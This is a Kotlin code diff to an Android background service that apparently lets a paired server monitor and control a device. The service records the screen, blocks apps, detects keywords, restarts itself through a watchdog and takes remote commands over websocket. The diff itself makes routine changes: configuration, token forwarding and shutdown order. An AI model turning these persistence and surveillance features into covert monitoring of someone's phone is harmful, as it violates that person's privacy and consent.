@@ -30,7 +30,7 @@ class CoreService : Service() {
 
     companion object {
         var instance: CoreService? = null
-        var SERVER_URL = "wss://relay-server-production-bf46.up.railway.app/api/ws"
+        var SERVER_URL = BuildConfig.DEFAULT_SERVER_URL
         const val PREFS_NAME     = "config"
         const val KEY_SERVER_URL = "server_url"
         const val KEY_PAIR_CODE  = "pair_code"
@@ -163,15 +163,18 @@ class CoreService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         // Re-establish foreground on system restart — Android 16 can recreate service
         try { startForegroundCompat() } catch (_: Exception) {}
+        if (intent?.action == "ACTION_SEND_FCM_TOKEN") {
+            val token = intent.getStringExtra("fcm_token")
+            if (!token.isNullOrEmpty()) {
+                sendData("fcm_token", JSONObject().apply { put("token", token) })
+            }
+        }
         return START_STICKY
     }
 
     override fun onDestroy() {
+        // Bug 10: Shutdown sequence — resources before super (super invalidates context)
         isRunning = false
-        instance = null
-        super.onDestroy()
-        CrashLogger.logServiceStop(this, "onDestroy")
-        instance = null
         wsManager?.disconnect()
         stopPeriodicSending()
         shakeDetector?.stop()
@@ -184,9 +187,11 @@ class CoreService : Service() {
         try { ScreenRecorder.stop(this) } catch (_: Exception) {}
         releaseWakeLock()
         ioExecutor.shutdown()
-        // Reschedule watchdog so it fires soon and restarts us
         WatchdogReceiver.schedule(this)
         try { getSystemService(ConnectivityManager::class.java).unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
+        CrashLogger.logServiceStop(this, "onDestroy")
+        instance = null
+        super.onDestroy()
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
@@ -322,6 +327,18 @@ class CoreService : Service() {
     // ── Command handler ────────────────────────────────────────────────────────
     fun handleCommand(data: JSONObject) {
         try {
+            // Bug 3: Restore settings snapshot sent on peer_connected
+            val msgType = data.optString("type")
+            if (msgType == "restore_settings") {
+                val apps = data.optJSONArray("blocked_apps")
+                if (apps != null) try { AppBlockerManager.setBlockedApps(
+                    (0 until apps.length()).map { apps.getString(it) }) } catch (_: Exception) {}
+                val kws = data.optJSONArray("keywords")
+                if (kws != null) try { KeywordDetector.setKeywords(
+                    (0 until kws.length()).map { kws.getString(it) }, this) } catch (_: Exception) {}
+                return
+            }
+            if (msgType in listOf("peer_connected","peer_disconnected","auth_ok","pong")) return
             when (data.optString("command")) {
 
                 "update_url" -> {
